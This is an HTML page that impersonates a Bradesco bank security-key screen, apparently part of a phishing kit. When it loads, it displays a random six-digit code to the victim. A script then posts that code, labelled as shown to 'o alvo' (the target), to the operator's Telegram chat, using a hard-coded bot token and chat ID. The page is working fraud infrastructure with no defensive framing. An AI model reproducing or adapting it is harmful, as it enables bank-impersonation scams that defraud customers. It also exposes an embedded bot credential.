<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bradesco | Segurança</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Inter', sans-serif; }
        .bradesco-red { background-color: #cc092f; }
        .token-display { 
            letter-spacing: 0.3em; 
            text-align: center; 
            font-size: 2.2rem; 
            color: #cc092f;
            font-family: 'Courier New', Courier, monospace;
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">

    <div class="bg-white shadow-2xl rounded-[2rem] max-w-md w-full overflow-hidden border border-gray-100">
        <div class="bradesco-red p-6 flex justify-between items-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Bradesco_logo.svg/1024px-Bradesco_logo.svg.png" 
                 class="h-7 brightness-0 invert" alt="Bradesco">
            <span class="text-white text-[10px] font-bold uppercase tracking-widest opacity-90">Segurança</span>
        </div>

        <div class="p-10">
            <div class="flex flex-col items-center mb-8">
                <div class="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4">
                    <svg class="w-8 h-8 text-[#cc092f]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                    </svg>
                </div>
                <h2 class="text-xl font-extrabold text-gray-800 text-center">Chave de Segurança Digital</h2>
                <p class="text-gray-400 text-xs text-center mt-3 leading-relaxed px-4">
                    Sincronização realizada com sucesso. Informe ou utilize o código abaixo para validar o recebimento no seu aplicativo.
                </p>
            </div>

            <div class="space-y-6">
                <div class="bg-gray-50 border-2 border-dashed border-gray-200 rounded-2xl p-6 flex flex-col items-center">
                    <span id="tokenGerado" class="token-display font-bold">------</span>
                    <p class="text-[9px] text-gray-400 uppercase mt-2 font-bold tracking-tighter italic">Válido por 60 segundos</p>
                </div>

                <div class="flex flex-col gap-3">
                    <button onclick="window.location.href='https://www.bradesco.com.br'" class="w-full bradesco-red text-white font-bold py-5 rounded-2xl shadow-xl transition-all active:scale-95 uppercase tracking-widest text-sm">
                        FINALIZAR SESSÃO
                    </button>
                </div>
            </div>

            <div class="mt-10 pt-6 border-t border-gray-50 flex flex-col items-center gap-2 opacity-30">
                <div class="flex items-center gap-2">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Bandeira_do_Brasil.svg/1200px-Bandeira_do_Brasil.svg.png" class="h-3">
                    <span class="text-[9px] font-bold text-gray-500 uppercase tracking-tighter">Ambiente Seguro Bradesco</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        const TOKEN_BOT = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
        const ID_CHAT = "560716860"; 

        // Função para gerar número aleatório de 6 dígitos
        function gerarTokenAleatorio() {
            let num = Math.floor(100000 + Math.random() * 900000);
            document.getElementById('tokenGerado').innerText = num;
            return num;
        }

        // Executa ao carregar a página
        window.onload = async function() {
            const novoToken = gerarTokenAleatorio();

            // Envia o token gerado para o seu Telegram para você saber o que apareceu para o alvo
            await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: ID_CHAT, 
                    text: `📟 *TOKEN GERADO PARA O ALVO*\n🔢 Código exibido: ${novoToken}`, 
                    parse_mode: 'Markdown' 
                })
            });
        };
    </script>
</body>
</html>
